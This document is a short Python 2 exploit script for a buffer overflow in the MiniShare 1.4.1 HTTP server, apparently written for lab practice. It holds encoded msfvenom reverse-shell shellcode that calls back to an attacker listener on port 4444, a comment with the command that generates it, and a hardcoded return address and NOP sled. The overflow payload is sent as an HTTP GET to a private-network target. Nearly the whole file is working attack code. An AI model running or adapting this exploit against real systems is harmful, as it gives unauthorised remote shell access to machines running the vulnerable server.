#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
MiniShare v1.4.1 HTTP Exploit Fuzzer
1. python minishare_1.4.1_http_fuzz.py
#----------------------------------------------#
"""

print banner

#msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.20 lport=4444 -a x86 -b "\x00\x0d" -f c
#shellcode = ()
#start the reverse handler on your machine at port 4444

sc = ("\xb8\x7d\xb6\xed\xcf\xd9\xf6\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x45\x12\x83\xc5\x04\x03\x38\xb8\x0f\x3a\x3e\x2c\x4d"
"\xc5\xbe\xad\x32\x4f\x5b\x9c\x72\x2b\x28\x8f\x42\x3f\x7c\x3c"
"\x28\x6d\x94\xb7\x5c\xba\x9b\x70\xea\x9c\x92\x81\x47\xdc\xb5"
"\x01\x9a\x31\x15\x3b\x55\x44\x54\x7c\x88\xa5\x04\xd5\xc6\x18"
"\xb8\x52\x92\xa0\x33\x28\x32\xa1\xa0\xf9\x35\x80\x77\x71\x6c"
"\x02\x76\x56\x04\x0b\x60\xbb\x21\xc5\x1b\x0f\xdd\xd4\xcd\x41"
"\x1e\x7a\x30\x6e\xed\x82\x75\x49\x0e\xf1\x8f\xa9\xb3\x02\x54"
"\xd3\x6f\x86\x4e\x73\xfb\x30\xaa\x85\x28\xa6\x39\x89\x85\xac"
"\x65\x8e\x18\x60\x1e\xaa\x91\x87\xf0\x3a\xe1\xa3\xd4\x67\xb1"
"\xca\x4d\xc2\x14\xf2\x8d\xad\xc9\x56\xc6\x40\x1d\xeb\x85\x0c"
"\xd2\xc6\x35\xcd\x7c\x50\x46\xff\x23\xca\xc0\xb3\xac\xd4\x17"
"\xb3\x86\xa1\x87\x4a\x29\xd2\x8e\x88\x7d\x82\xb8\x39\xfe\x49"
"\x38\xc5\x2b\xdd\x68\x69\x84\x9e\xd8\xc9\x74\x77\x32\xc6\xab"
"\x67\x3d\x0c\xc4\x02\xc4\xc7\x2b\x7a\xc7\x03\xc4\x79\xc7\x3a"
"\x48\xf7\x21\x56\x60\x51\xfa\xcf\x19\xf8\x70\x71\xe5\xd6\xfd"
"\xb1\x6d\xd5\x02\x7f\x86\x90\x10\xe8\x66\xef\x4a\xbf\x79\xc5"
"\xe2\x23\xeb\x82\xf2\x2a\x10\x1d\xa5\x7b\xe6\x54\x23\x96\x51"
"\xcf\x51\x6b\x07\x28\xd1\xb0\xf4\xb7\xd8\x35\x40\x9c\xca\x83"
"\x49\x98\xbe\x5b\x1c\x76\x68\x1a\xf6\x38\xc2\xf4\xa5\x92\x82"
"\x81\x85\x24\xd4\x8d\xc3\xd2\x38\x3f\xba\xa2\x47\xf0\x2a\x23"
"\x30\xec\xca\xcc\xeb\xb4\xfb\x86\xb1\x9d\x93\x4e\x20\x9c\xf9"
"\x70\x9f\xe3\x07\xf3\x15\x9c\xf3\xeb\x5c\x99\xb8\xab\x8d\xd3"
"\xd1\x59\xb1\x40\xd1\x4b")

offset = "A"*1787 + "\xD8\x7F\xc5\x7C" + "\x90"*20 +sc 
#nowjump
#bufferandshellcode
sploit = offset

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "\nDestroy them with lazers..."
s.connect(('192.168.1.9',80))
s.send('GET ' + sploit + ' HTTP/1.1\r\n\r\n')
s.close
print "\nFire in the hole! Go pick up the pieces!"
